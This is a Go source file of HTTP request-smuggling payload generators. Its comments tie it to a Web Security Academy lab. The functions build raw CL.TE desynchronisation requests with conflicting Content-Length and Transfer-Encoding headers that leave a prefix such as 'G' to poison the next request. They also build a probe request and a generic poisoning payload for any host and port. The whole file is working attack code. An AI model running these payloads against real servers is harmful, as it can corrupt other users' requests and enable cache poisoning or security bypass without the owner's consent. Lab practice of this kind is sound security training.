package payload

import (
	"strconv"
)

// CL_TE_GPOST_ATTACK generates the exact Web Security Academy lab attack payload.
// This creates a CL.TE desynchronization where:
// - Front-end reads 6 bytes by Content-Length
// - Back-end parses chunked encoding differently
// - Leftover "G" contaminates the next request, creating "GPOST" method
func CL_TE_GPOST_ATTACK(host string, port int) string {
	return "POST / HTTP/1.1\r\n" +
		"Host: " + host + ":" + strconv.Itoa(port) + "\r\n" +
		"Connection: keep-alive\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\n" +
		"Content-Length: 6\r\n" +
		"Transfer-Encoding: chunked\r\n" +
		"\r\n" +
		"0\r\n" +
		"\r\n" +
		"G"
}

// ProbeRequestAfterPoison sends a simple GET request after smuggling.
// This request should be affected by the poisoned request state in the backend.
func ProbeRequestAfterPoison(host string, port int) string {
	return "GET / HTTP/1.1\r\n" +
		"Host: " + host + ":" + strconv.Itoa(port) + "\r\n" +
		"Connection: close\r\n" +
		"\r\n"
}

// HTTP1_CL_TE_Poison generates a CL.TE attack that poisons the next request.
// poisonChar is the character to prepend to the next request (e.g., "G" for GPOST)
func HTTP1_CL_TE_Poison(host string, port int, poisonChar string) string {
	poisonLen := len(poisonChar) + 5 // 0\r\n\r\n + poisonChar
	clValue := strconv.Itoa(poisonLen)
	return "POST / HTTP/1.1\r\n" +
		"Host: " + host + ":" + strconv.Itoa(port) + "\r\n" +
		"Connection: keep-alive\r\n" +
		"Content-Length: " + clValue + "\r\n" +
		"Transfer-Encoding: chunked\r\n" +
		"\r\n" +
		"0\r\n" +
		"\r\n" +
		poisonChar
}
